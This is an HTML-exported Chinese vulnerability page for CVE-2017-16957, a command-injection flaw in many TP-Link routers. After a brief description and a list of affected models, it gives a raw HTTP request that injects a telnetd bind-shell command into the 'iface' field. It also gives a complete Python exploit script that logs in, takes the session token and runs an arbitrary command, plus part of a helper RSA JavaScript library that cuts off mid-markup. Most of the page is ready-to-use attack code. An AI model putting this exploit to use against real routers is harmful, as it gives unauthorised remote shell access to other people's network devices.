<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="Xca86fc0a5eef36d0199dd7cd8f14c36647aee95"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2017-16957</span><span class="csECDA2D3">）</span><span class="csDE05BCC">TP-Link </span><span class="csECDA2D3">命令注入漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">TP-Link TL-WVR</span><span class="cs9C1B1871">等都是中国普联（</span><span class="cs8926E06">TP-LINK</span><span class="cs9C1B1871">）公司的无线路由器产品。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">多款</span><span class="cs8926E06">TP-Link</span><span class="cs9C1B1871">产品中存在命令注入漏洞。远程攻击者可通过向</span><span class="cs8926E06">cgi-bin/luci</span><span class="cs9C1B1871">发送</span><span class="cs8926E06">face</span><span class="cs9C1B1871">字段中带有</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">元字符的</span><span class="cs8926E06">admin/diagnostic</span><span class="cs9C1B1871">命令利用该漏洞执行任意命令。</span></p><h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">TP-LINK TL-WVR TP-LINK TL-WVR300 v4 TP-LINK TL-WVR302 v2 TP-LINK TL-WVR450 TP-LINK TL-WVR450L TP-LINK TL-WVR450G v5 TP-LINK TL-WVR458 TP-LINK TL-WVR458L TP-LINK TL-WVR458P TP-LINK TL-WVR900G v3 TP-LINK TL-WVR1200L TP-LINK TL-WVR900L TP-LINK TL-WVR1300L TP-LINK TL-WVR1300G TP-LINK TL-WVR1750L TP-LINK TL-WVR2600L TP-LINK TL-WVR4300L TP-LINK TL-WAR450 TP-LINK TL-WAR302 TP-LINK TL-WAR2600L TP-LINK TL-WAR1750L TP-LINK TL-WAR1300L TP-LINK TL-WAR1200L TP-LINK TL-WAR900L TP-LINK TL-WAR458 TP-LINK TL-WAR450L TP-LINK TL-ER5510G v2 TP-LINK TL-ER5510G v3 TP-LINK TL-ER5520G v2 TP-LINK TL-ER5520G v3 TP-LINK TL-ER6120G v2 TP-LINK TL-ER6520G v2 TP-LINK TL-ER6520G v3 TP-LINK TL-ER3210G TP-LINK TL-ER7520G TP-LINK TL-ER6520G TP-LINK TL-ER6510G TP-LINK TL-ER6220G TP-LINK TL-ER6120G TP-LINK TL-ER6110G TP-LINK TL-ER5120G TP-LINK TL-ER5110G TP-LINK TL-ER3220G TP-LINK TL-R479P-AC TP-LINK TL-R478G+ TP-LINK TL-R478G TP-LINK TL-R478+ TP-LINK TL-R478 TP-LINK TL-R473GP-AC TP-LINK TL-R473P-AC TP-LINK TL-R473G TP-LINK TL-R473 TP-LINK TL-R4299G TP-LINK TL-R4239G TP-LINK TL-R4149G TP-LINK TL-R488 TP-LINK TL-R483 TP-LINK TL-R483G TP-LINK TL-R479GP-AC TP-LINK TL-R479GPE-AC</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs3A447A38"><span class="cs9FB05234">POST /cgi-bin/luci/;stok=ea2178b4514da7ae227f4ec192536930/admin/diagnostic?form=diag HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 370</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: application/json, text/javascript, */*; q=0.01</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Origin: http://192.168.3.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Requested-With: XMLHttpRequest</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: http://192.168.3.1/webpages/index.html</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: sysauth=be9b6f2b4b9a76a8a658e108c6197f2c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">data=%7B%22method%22%3A%22start%22%2C%22params%22%3A%7B%22type%22%3A%220%22%2C%22type_hidden%22%3A%220%22%2C%22ipaddr_ping%22%3A%22baidu.com%22%2C%22iface_ping%22%3A%22WAN1%22%2C%22ipaddr%22%3A%22baidu.com%22%2C%22iface%22%3A%22%3Btelnetd+-p+24+-l+/bin/sh%22%2C%22count%22%3A%221%22%2C%22pktsize%22%3A%2264%22%2C%22my_result%22%3A%22The+Router+is+ready.%5Cr%5Cn%22%7D%7D</span></p><h3 class="cs868C439D">
			<a name="漏洞脚本"><span class="csD6CA00D2">漏洞脚本</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234"># Tested product: TL-WVR450L</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Hardware version</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">V1.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Firmware version: 20161125</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># The RSA_Encryption_For_Tplink.js is use for Rsa Encryption to the password when login the web manager.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># You can download the RSA_Encryption_For_Tplink.js by https://github.com/coincoin7/Wireless-Router-Vulnerability/blob/master/RSA_Encryption_For_Tplink.js</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import execjs</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import json</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import urllib</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def read_js():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;file = open(&quot;./RSA_Encryption_For_Tplink.js&quot;, &#39;r&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;line = file.readline()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;js = &#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while line:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;js = js + line</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;line = file.readline()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;file.close()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return js</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def execute(ip, port, username, passwd, cmd):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s = requests.session()</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uri = &quot;http://{}:{}&quot;.format(ip,port)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;headers = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Content-Type&#39;:&#39;application/x-www-form-urlencoded; charset=UTF-8&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Referer&#39;: &#39;http://{}/webpages/login.html&#39;.format(ip)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;method&quot;:&quot;get&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret = s.post(uri + &#39;/cgi-bin/luci/;stok=/login?form=login&#39;, data=urllib.urlencode({&quot;data&quot;:json.dumps(payload)}), headers=headers, timeout=5)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsa_public_n = json.loads(ret.text)[&#39;result&#39;][&#39;password&#39;][0].encode(&quot;utf-8&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsa_public_e = json.loads(ret.text)[&#39;result&#39;][&#39;password&#39;][1].encode(&quot;utf-8&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;js = read_js()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;js_handle = execjs.compile(js)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password = js_handle.call(&#39;MainEncrypt&#39;, rsa_public_n, rsa_public_e, passwd)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;method&quot;:&quot;login&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;params&quot;:{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;username&quot;:&quot;{}&quot;.format(username),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;password&quot;:&quot;{}&quot;.format(password)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret = s.post(uri + &#39;/cgi-bin/luci/;stok=/login?form=login&#39;, data=urllib.urlencode({&quot;data&quot;:json.dumps(payload)}), headers=headers, timeout=5)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stok = json.loads(ret.text)[&#39;result&#39;][&#39;stok&#39;].encode(&#39;utf-8&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cookie = ret.headers[&#39;Set-Cookie&#39;]</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &#39;[+] Login success&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &#39;[+] Get The Token: &#39; + stok</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &#39;[+] Get The Cookie: &#39; + cookie</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;headers = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Content-Type&#39;:&#39;application/x-www-form-urlencoded; charset=UTF-8&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Referer&#39;:&#39;http://{}/webpages/login.html&#39;.format(ip),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Cookie&#39;:&#39;{}&#39;.format(cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;method&quot;:&quot;start&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;params&quot;:{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;type&quot;:&quot;0&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;type_hidden&quot;:&quot;0&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;ipaddr_ping&quot;:&quot;127.0.0.1&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;iface_ping&quot;:&quot;WAN1&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;ipaddr&quot;:&quot;127.0.0.1&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;iface&quot;:&quot;;{}&quot;.format(cmd),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;count&quot;:&quot;1&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;pktsize&quot;:&quot;64&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;my_result&quot;:&quot;exploit&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret = s.post(uri + &#39;/cgi-bin/luci/;stok={}/admin/diagnostic?form=diag&#39;.format(stok), data=urllib.urlencode({&quot;data&quot;:json.dumps(payload)}), headers=headers, timeout=5)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#print ret.text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &#39;[+] Finish RCE&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &#39;--------------------------------------------------------------&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return True</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return False</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">if __name__==&#39;__main__&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;-----------Tplink LUCI diagnostic Authenticated RCE-----------&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print execute(&#39;192.168.1.1&#39;, 80, &#39;admin&#39;, &#39;admin&#39;, &#39;telnetd -p 24 -l /bin/sh&#39;)</span></p><h3 class="cs868C439D">
			<a name="rsaencryptionfortplinkjs-文件"><span class="csD1E291E2">RSA_Encryption_For_Tplink.js </span><span class="csD6CA00D2">文件</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">// Copyright (c) 2005 &nbsp;Tom Wu</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// All Rights Reserved.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// See &quot;LICENSE&quot; for details.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// Basic JavaScript BN library - subset useful for RSA encryption.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// Bits per digit</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// JavaScript engine analysis</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">var BI_RC = new Array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var BI_RM = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var dbits;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var canary = 0xdeadbeefcafe;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var j_lm = ((canary&amp;0xffffff)==0xefcafe);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var rng_psize = 256;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var rng_state;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var rng_pool;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var rng_pptr;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// Initialize the pool with junk if needed.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.am = am2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">dbits = 30;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.DB = dbits;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.DM = ((1&lt;&lt;dbits)-1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.DV = (1&lt;&lt;dbits);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var BI_FP = 52;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.FV = Math.pow(2,BI_FP);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.F1 = BI_FP-dbits;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.F2 = 2*dbits-BI_FP;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// protected</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.copyTo = bnpCopyTo;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.fromInt = bnpFromInt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.fromString = bnpFromString;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.clamp = bnpClamp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.dlShiftTo = bnpDLShiftTo;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.drShiftTo = bnpDRShiftTo;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.lShiftTo = bnpLShiftTo;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.rShiftTo = bnpRShiftTo;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.subTo = bnpSubTo;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.multiplyTo = bnpMultiplyTo;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.squareTo = bnpSquareTo;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.divRemTo = bnpDivRemTo;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.invDigit = bnpInvDigit;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.isEven = bnpIsEven;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.exp = bnpExp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// public</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.toString = bnToString;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.negate = bnNegate;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.abs = bnAbs;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.compareTo = bnCompareTo;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.bitLength = bnBitLength;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.mod = bnMod;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.prototype.modPowInt = bnModPowInt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// &quot;constants&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.ZERO = nbv(0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BigInteger.ONE = nbv(1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// Digit conversions</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var rr,vv;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rr = &quot;0&quot;.charCodeAt(0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for(vv = 0; vv &lt;= 9; ++vv) BI_RC[rr++] = vv;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rr = &quot;a&quot;.charCodeAt(0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for(vv = 10; vv &lt; 36; ++vv) BI_RC[rr++] = vv;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rr = &quot;A&quot;.charCodeAt(0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for(vv = 10; vv &lt; 36; ++vv) BI_RC[rr++] = vv;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Classic.prototype.convert = cConvert;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Classic.prototype.revert = cRevert;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Classic.prototype.reduce = cReduce;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Classic.prototype.mulTo = cMulTo;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Classic.prototype.sqrTo = cSqrTo; &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Arcfour.prototype.init = ARC4init;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Arcfour.prototype.next = ARC4next;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">SecureRandom.prototype.nextBytes = rng_get_bytes;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Montgomery.prototype.convert = montConvert;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Montgomery.prototype.revert = montRevert;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Montgomery.prototype.reduce = montReduce;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Montgomery.prototype.mulTo = montMulTo;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Montgomery.prototype.sqrTo = montSqrTo;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Arcfour.prototype.init = ARC4init;</span><span class="cs8926E06"><br/></span><span 